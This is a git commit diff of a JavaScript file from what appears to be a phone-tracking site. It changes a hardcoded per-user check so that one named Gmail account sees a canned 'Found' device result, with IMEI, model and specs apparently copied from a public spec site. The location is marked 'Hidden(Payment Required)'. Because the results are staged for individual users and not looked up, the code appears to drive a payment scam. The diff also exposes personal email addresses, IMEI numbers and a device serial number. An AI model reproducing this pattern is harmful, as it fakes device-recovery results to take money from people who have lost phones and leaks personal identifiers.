cee1d23b06d95070abb78069e4929c4e51d056b7
trackmateai <136100891+trackmateai@users.noreply.github.com>
2024-02-02 13:04:25 +0200

    Update appNewAppFeedback.js

--- appNewAppFeedback.js
+++ appNewAppFeedback.js
@@ -73,12 +73,12 @@ if (username=="wizzy.kellyink@gmail.com"){
         mainInfo.style.display=("block");
         moreInfo.style.display=("block");
    }
-if (username=="flockie2002@gmail.com"){
+if (username=="dicemodiagane@gmail.com"){
             phoneImageLay.style.display=("block");
-            phoneImage.src = "https://fdn2.gsmarena.com/vv/bigpic/samsung-galaxy-tab-e-sm-t561.jpg";
+            phoneImage.src = "https://www.imei.info/media/t/gsm-cache/u/Z/dd2mZE-d/huawei-p40-lite.jpg";
     
-        mainInfo.innerHTML=("STATUS: <font color=#00ee00>Found</font><br/>IMEI: <font color=#00ee00> 352690103365666</font><br/>  Model: T561 Galaxy Tab E 9.6inch 3G (SM-T561)br/>Brand: Samsung<br/>DeviceType:  Smartphone<br/>  Location: <font color=#ff0000>  Hidden(Payment Required)</font><br/>  Country Code: BW<br/>  Country Name: Botswana ");
-        moreInfo.innerHTML=("Model Info: MOBILE SM-T561N WHITE XFA<br/>Search Term: 352690103365666<br/>IMEI 1: 352690103365666<br/>Serial Number:<font color=#ff0000> R52M611PE7V</font><br/>Model Desc: Samsung Galaxy Tab E 9.6<br/>Model Name: SM-T561N<br/>Model Number: SM-T561NZWAXFA<br/>Warranty Status: Out of Warranty<br/>Estimated Warranty End Date: 26-06-2021<br/>Production location: Korea SEC<br/>Production Date: 26-06-2019<br/>Country: South Africa<br/>Carrier: Factory Unlocked  ");
+        mainInfo.innerHTML=("STATUS: <font color=#00ee00>Found</font><br/>IMEI: <font color=#00ee00> 863797057658889</font><br/>  Model: P40 lite (JNY-LX1)<br/>Brand: HUAWEI<br/>DeviceType:  Smartphone<br/>  Location: <font color=#ff0000>  Hidden(Payment Required)</font><br/>  Country Code: BW<br/>  Country Name: Botswana ");
+        moreInfo.innerHTML=(" Operating System	Android 10<br/>Chipset	Huawei HiSilicon KIRIN 810<br/>Number of CPU Cores	2<br/>RAM	6 GB<br/>Internal Memory	128 GB<br/>Memory Card Type	microSDXC<br/>GPU Name	ARM Mali-G52 MP6<br/>GPU Cores	6<br/>GPU Clock	820.0 MHz<br/> Width	76.3 mm<br/>Height	159.2 mm<br/>Thickness	8.7 mm<br/>Weight	183.0 g<br/>DisplayType	LCD_IPS<br/>Diagonal	6.4 inches<br/>Resolution	1080x2310 px<br/>Screen-to-body ratio	83.5 %<br/>Pixel density	398 ppi<br/>Colors	16M");
         
         mainInfo.style.display=("block");
         moreInfo.style.display=("block");
